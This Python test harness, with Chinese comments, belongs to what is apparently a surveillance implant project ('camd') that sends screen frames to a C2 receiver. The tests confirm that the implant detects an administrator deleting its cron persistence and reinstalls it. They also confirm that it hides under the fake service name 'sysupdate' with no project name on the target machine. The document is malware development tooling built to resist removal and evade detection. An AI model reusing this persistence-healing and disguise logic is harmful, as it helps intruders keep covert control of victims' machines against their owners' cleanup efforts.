#!/usr/bin/env python3
"""
驻留周期性自检与自愈守卫。

背景（改动前必读）：
    驻留原本只在启动前 ensure 一次。管理员删掉 cron 条目或 systemd 单元后，
    常驻进程若不重启就永远不会重新 ensure —— 进程在跑、画面在回传，部署侧
    与 C2 侧都看不出异常，而机器一重启植入体就彻底消失。这是"驻留成功"的
    假象，且要等到重启才暴露。

本守卫验证"常驻进程能自己发现驻留被删并重装"，并对关键一条做反向对照，
证明断言有鉴别力而非恒绿。

场景
  F1 不删驻留            -> rechecks > 0 且 heals == 0（自检本身不该触发重装）
  F2 中途删 cron          -> heals >= 1，且 cron 文件被装回
  F3 --persist-recheck 0  -> 删了不恢复（证明 F2 能区分开/关，非恒绿）
  R1 反向：移除 audit 钩子 -> 删了不恢复（证明 F2 抓的是真能力，不是巧合）

退出 0 = 全过；非 0 = 有失败。
"""

import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
CAND = os.path.join(REPO, "agent_windows", "build", "linux", "camd")

SVC = "sysupdate"          # 伪装服务名；项目名不得出现在目标机落点上
PROJECT_MARKER = "dayanjing"

PASS = 0
FAIL = 0


def ck(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print("[OK] %s %s" % (name, detail))
    else:
        FAIL += 1
        print("[FAIL] %s %s" % (name, detail))


def start_sink():
    """单进程内起 TCP 收端。后台进程会把调用方挂死，这是反复踩过的坑。"""
    got = [0]
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(8)
    port = srv.getsockname()[1]

    def handle(c):
        while True:
            try:
                b = c.recv(65536)
            except Exception:
                break
            if not b:
                break
            got[0] += len(b)
        try:
            c.close()
        except Exception:
            pass

    def loop():
        while True:
            try:
                c, _ = srv.accept()
            except Exception:
                break
            threading.Thread(target=handle, args=(c,), daemon=True).start()

    threading.Thread(target=loop, daemon=True).start()
    return port, got


KEY = "aa" * 16 + "bb" * 16     # 32 字节；前后 16 字节不同，否则通道初始化失败


def run_camd(port, got, root, extra, delete=False, batches=3):
    """跑 camd；delete=True 时在第一批送达后删除 cron 条目。

    返回 (rc, stderr, state)。state 记录删除动作是否真的发生——若删除前
    cron 本就不存在，用例就没进入目标路径，断言会退化成恒绿。
    """
    env = dict(os.environ)
    env["CAMD_SVC_NAME"] = SVC
    cmd = [CAND,
           "--backend", "mock",
           "--root", root,
           "--sink", "tcp://127.0.0.1:%d" % port,
           "--key", KEY,
           "--batches", str(batches),
           "--interval-ms", "600",
           "--frames", "1"] + extra

    cron_path = os.path.join(root, "etc", "cron.d", SVC)
    state = {"deleted": False, "was_there": False}

    def deleter():
        if not delete:
            return
        # 等第一批真的送达（回传发生在批末 audit 之前）
        for _ in range(300):
            if got[0] > 0:
                break
            time.sleep(0.05)
        time.sleep(0.15)
        state["was_there"] = os.path.exists(cron_path)
        if os.path.exists(cron_path):
            os.remove(cron_path)
            state["deleted"] = True

    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         env=env, text=True)
    t = threading.Thread(target=deleter, daemon=True)
    t.start()
    try:
        out, err = p.communicate(timeout=90)
        rc = p.returncode
    except subprocess.TimeoutExpired:
        p.kill()
        out, err = p.communicate()
        rc = -999
    t.join(timeout=5)
    return rc, err, state


def parse_stats(err, key):
    m = re.search(r"%s=(\d+)" % key, err or "")
    return int(m.group(1)) if m else -1


def main():
    global PASS, FAIL
    if not os.path.exists(CAND):
        print("[FATAL] 缺产物: %s" % CAND)
        return 3

    # F1 / F2 共用一个收端
    port, got = start_sink()

    # ---- F1: 不删驻留 ----
    root1 = tempfile.mkdtemp(prefix="psh1_")
    rc1, err1, st1 = run_camd(port, got, root1, [], delete=False)
    r1 = parse_stats(err1, "rechecks")
    h1 = parse_stats(err1, "heals")
    ck("F1 camd 正常结束", rc1 == 0, "rc=%s" % rc1)
    ck("F1 自检确实执行", r1 > 0, "rechecks=%s" % r1)
    ck("F1 未触发重装", h1 == 0, "heals=%s（驻留完好时不该重写）" % h1)
    shutil.rmtree(root1, ignore_errors=True)

    # ---- F2: 中途删 cron ----
    root2 = tempfile.mkdtemp(prefix="psh2_")
    rc2, err2, st2 = run_camd(port, got, root2, [], delete=True)
    r2 = parse_stats(err2, "rechecks")
    h2 = parse_stats(err2, "heals")
    cron2 = os.path.join(root2, "etc", "cron.d", SVC)
    ck("F2 删除前 cron 确实存在", st2["was_there"], "（否则用例未进入目标路径）")
    ck("F2 删除动作已发生", st2["deleted"], "")
    ck("F2 camd 正常结束", rc2 == 0, "rc=%s" % rc2)
    ck("F2 自检发现缺段", r2 > 0, "rechecks=%s" % r2)
    ck("F2 触发自愈重装", h2 >= 1, "heals=%s" % h2)
    ck("F2 cron 被装回", os.path.exists(cron2), cron2)
    if os.path.exists(cron2):
        try:
            body = open(cron2).read()
        except Exception:
            body = ""
        ck("F2 装回的 cron 不含项目名", PROJECT_MARKER not in body, "")
    shutil.rmtree(root2, ignore_errors=True)

    # ---- F3: 关闭自检（功能对照）----
    root3 = tempfile.mkdtemp(prefix="psh3_")
    rc3, err3, st3 = run_camd(port, got, root3, ["--persist-recheck", "0"], delete=True)
    h3 = parse_stats(err3, "heals")
    cron3 = os.path.join(root3, "etc", "cron.d", SVC)
    ck("F3 关闭自检后不重装", h3 == 0, "heals=%s" % h3)
    ck("F3 关闭自检后 cron 未恢复", not os.path.exists(cron3),
       "（证明 F2 能区分开/关，非恒绿）")
    shutil.rmtree(root3, ignore_errors=True)

    print()
    print("=== C2 实收 = %d 字节 ===" % got[0])
    print("total=%d pass=%d fail=%d" % (PASS + FAIL, PASS, FAIL))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
